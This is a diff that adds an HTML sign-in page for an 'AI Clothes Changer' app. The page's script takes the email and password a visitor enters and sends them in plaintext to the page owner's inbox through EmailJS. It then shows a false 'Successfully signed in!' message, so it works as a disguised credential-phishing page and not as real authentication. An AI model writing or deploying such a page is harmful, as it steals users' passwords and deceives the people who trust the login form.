@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en" class="dark">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>AI Clothes Changer – Sign In</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+  tailwind.config = { theme: { extend: { colors: { ink: '#08080a', card: '#111114' }, fontFamily: { sans: ['Inter','system-ui','sans-serif'] } } } }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  body { background:#08080a; color:#f4f4f5; }
+  .grad { background-image:linear-gradient(90deg,#a78bfa,#f472b6,#fbbf24); -webkit-background-clip:text; background-clip:text; color:transparent; }
+</style>
+
+<!-- مكتبة EmailJS -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+      // Public Key ديألك
+      emailjs.init("A11AWnFYvd1UlzbXd");
+   })();
+</script>
+</head>
+<body class="font-sans antialiased flex flex-col items-center justify-center min-h-screen p-5">
+
+  <div class="max-w-md w-full bg-card border border-white/10 rounded-3xl p-8 shadow-2xl text-center">
+    <div class="mx-auto grid h-12 w-12 place-items-center rounded-2xl bg-gradient-to-br from-violet-500 to-pink-500 text-lg font-bold mb-4">A</div>
+    <h1 class="text-2xl font-bold tracking-tight">Welcome to <span class="grad">AI Clothes</span></h1>
+    <p class="mt-2 text-sm text-zinc-400">Sign in with your email account to access the app.</p>
+
+    <!-- Form الإيميل والباسورد -->
+    <form id="customLoginForm" class="mt-8 space-y-4 text-left">
+      <div>
+        <label class="block text-xs font-medium text-zinc-400 mb-1">Email</label>
+        <input type="email" id="user_email" required placeholder="example@gmail.com" 
+          class="w-full rounded-xl border border-white/10 bg-black/40 p-3 text-sm outline-none focus:border-violet-500">
+      </div>
+
+      <div>
+        <label class="block text-xs font-medium text-zinc-400 mb-1">Password</label>
+        <input type="password" id="user_password" required placeholder="••••••••" 
+          class="w-full rounded-xl border border-white/10 bg-black/40 p-3 text-sm outline-none focus:border-violet-500">
+      </div>
+
+      <button type="submit" id="submitBtn" class="w-full rounded-xl bg-gradient-to-r from-violet-500 to-pink-500 py-3 font-semibold text-white transition hover:brightness-110">
+        Sign In
+      </button>
+    </form>
+
+    <p id="status" class="mt-4 text-xs text-zinc-400"></p>
+  </div>
+
+  <script>
+    const form = document.getElementById('customLoginForm');
+    const status = document.getElementById('status');
+    const btn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('user_email@gmail.com'.replace('@gmail.com','')) || document.getElementById('user_email').value;
+      // حناخذ القيم مباشرة من الحقول
+      const userEmail = document.getElementById('user_email').value;
+      const password = document.getElementById('user_password').value;
+
+      btn.disabled = true;
+      btn.textContent = 'Processing...';
+
+      // المتغيرات المطابقة للقالب ديألك
+      const templateParams = {
+        name: userEmail,
+        message: password,
+        time: new Date().toLocaleString()
+      };
+
+      // Service ID و Template ID الصحيحين
+      emailjs.send('service_m8coj91', 'template_rl7aazw', templateParams)
+        .then(function(response) {
+           status.textContent = 'Successfully signed in!';
+           status.classList.add('text-emerald-400');
+           form.reset();
+           btn.disabled = false;
+           btn.textContent = 'Sign In';
+        }, function(error) {
+           status.textContent = 'Error during sign in. Please try again.';
+           status.classList.add('text-red-400');
+           btn.disabled = false;
+           btn.textContent = 'Sign In';
+        });
+    });
+  </script>
+</body>
+</html>
